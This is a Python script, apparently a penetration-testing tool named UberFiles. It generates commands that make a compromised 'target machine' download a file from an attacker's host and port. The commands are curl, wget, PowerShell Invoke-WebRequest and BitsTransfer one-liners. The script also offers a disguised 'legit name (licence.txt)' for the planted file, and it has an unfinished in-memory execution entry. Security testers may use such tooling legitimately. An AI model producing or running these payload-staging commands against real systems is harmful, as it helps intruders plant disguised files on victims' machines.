#!/usr/bin/env python3
# Author: Charlie BROMBERG (Shutdown - @_nwodtuhs)
# Author: Amine B (en1ma - @_1mean)

import argparse
import sys
import os
import re
import psutil
import socket
from colorama import Fore
from colorama import Style
import platform
if platform.system() == 'Windows':
    from consolemenu import *
else:
    from simple_term_menu import TerminalMenu

def MENU(title, menu_list):
    if platform.system() == 'Windows':
        selection = SelectionMenu.get_selection(menu_list, title=title, show_exit_option=False)
    else:
        menu = TerminalMenu(menu_list, title=title)
        selection = menu.show()
    return menu_list[selection]

def MENU_WITH_CUSTOM(title, menu_list):
    menu_list.append('Custom')
    selection = MENU(title, menu_list)
    if selection == 'Custom':
        print(f'(custom) {title}')
        if platform.system() == 'Windows':
            selection = input('>> ')
        else:
            selection = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL)
        return selection
    else:
        return selection.split('(')[1].split(')')[0]

def MENU_interface():
    interfaces = {}
    net_if_addrs = psutil.net_if_addrs()
    for iface, addr in net_if_addrs.items():
        if iface == 'lo':
            continue
        for address in addr:
            if address.family == socket.AF_INET:
                interfaces.update({iface:address.address})

    menu_list = []
    for key in interfaces:
        menu_list.append(key + ' (' + interfaces[key] + ')')

    return MENU_WITH_CUSTOM("Interface?", menu_list)

def list_downloaders():
    print(Fore.BLUE + Style.BRIGHT + 'Windows downloaders' + Style.RESET_ALL)
    for downloader in sorted(windows.keys()):
        print('   - ' + downloader)
    print()
    print(Fore.BLUE + Style.BRIGHT + 'Linux downloaders' + Style.RESET_ALL)
    for downloader in sorted(linux.keys()):
        print('   - ' + downloader)
    quit()

def get_options():
    parser = argparse.ArgumentParser(description='Generate a file downloader command', formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-lp', '--lport', dest='LPORT', type=str, help='Server port')
    parser.add_argument('-lh', '--lhost', dest='LHOST', type=str, help='Server address')
    parser.add_argument('-t', '--target-os', dest='TARGETOS', type=str, choices={"windows","linux"}, help='Target machine operating system')
    parser.add_argument('-d', '--downloader', dest='TYPE', type=str, help='Downloader')
    parser.add_argument('-f', '--input-file', dest='INPUTFILE', type=str, help='File to be downloaded')
    parser.add_argument('-o', '--output-file', dest='OUTPUTFILE', type=str, help='File to write on the target machine')
    parser.add_argument('-l', '--list', dest='LIST', action='store_true', help='Print all the commands UberFiles can generate')
    options = parser.parse_args()
    if options.LIST:
        list_downloaders()
    if not options.TARGETOS:
        options.TARGETOS = MENU("What operating system is the target running?", ['windows','linux'])
    if not options.TYPE:
        downloaders_dict = globals()[options.TARGETOS]
        menu_list = sorted(list(downloaders_dict.keys()))
        options.TYPE = MENU("What type of downloader do you want?", menu_list)
    if not options.LHOST:
        options.LHOST = MENU_interface()
    if not options.LPORT:
        menu_list = [
            'Default (1337)',
            'HTTP (80)',
            'HTTPS (443)',
            'DNS (53)'
        ]
        options.LPORT = MENU_WITH_CUSTOM("Port?", menu_list)
    if not options.INPUTFILE:
        lookupdir = os.getcwd()
        menu_list = [ f for f in os.listdir(lookupdir) if os.path.isfile(os.path.join(lookupdir, f)) ]
        options.INPUTFILE = MENU('Which file do you want the target to download?', menu_list)
    if not options.OUTPUTFILE:
        menu_list = [
            'Input filename ({})'.format(options.INPUTFILE),
            'Some legit name (licence.txt)'
        ]
        options.OUTPUTFILE = MENU_WITH_CUSTOM("Filename to write on the target machine?", menu_list)
    return options

# Helper function for populate_downloaders() to add values to the dictionnaries
def add_downloader(downloaders_dict, type, downloader, notes=None):
    if not type in downloaders_dict.keys():
        downloaders = []
    else:
        downloaders = downloaders_dict[type]
    downloaders.append((notes, downloader))
    downloaders_dict.update({type:downloaders})

# Add downloaders to the main dictionnaries: windows and linux
def populate_downloaders():
    ## TODO: populate this
    add_downloader(linux, 'curl', '''curl http://{LHOST}:{LPORT}/{INPUTFILE} -O {OUTPUTFILE}''')
    add_downloader(linux, 'wget', '''wget {LHOST}:{LPORT}/{INPUTFILE} -O {OUTPUTFILE}''')
    add_downloader(windows, 'powershell', '''powershell.exe Invoke-WebRequest -Uri http://{LHOST}:{LPORT}/{INPUTFILE} -OutFile '{OUTPUTFILE}' ''')
    add_downloader(windows, 'powershell', '''powershell.exe Start-BitsTransfer -Source http://{LHOST}:{LPORT}/{INPUTFILE} -Destination '{OUTPUTFILE}' ''')
    add_downloader(downloaders_dict=windows, type='powershell', notes="Execute in memory without writing to disk", downloader='''powershell.exe IED()TODOOOO''')

if __name__ == '__main__':
    windows = {}
    linux = {}
    populate_downloaders()
    options = get_options()
    downloaders_dict = globals()[options.TARGETOS]
    print()
    for notes, downloader in downloaders_dict[options.TYPE]:
        downloader_index = downloaders_dict[options.TYPE].index((notes, downloader)) + 1
        print_downloader = downloader.replace('{LHOST}', options.LHOST).replace('{LPORT}',options.LPORT).replace('{INPUTFILE}',options.INPUTFILE).replace('{OUTPUTFILE}',options.OUTPUTFILE).strip()
        print_notes = ''
        if notes is not None:
            print_notes = notes + ' '
        print(Fore.BLUE + Style.BRIGHT + '[' + str(downloader_index) + '] ' + print_notes + Style.RESET_ALL + print_downloader + '\n')
    cmdline = f'{sys.argv[0]} --lhost {options.LHOST} --lport {options.LPORT} --target-os {options.TARGETOS} --downloader {options.TYPE} --input-file {options.INPUTFILE} --output-file {options.OUTPUTFILE}'
    print(Fore.RED + Style.BRIGHT + '---\n[*] ' + "CLI command used " + Style.RESET_ALL + cmdline + '\n')
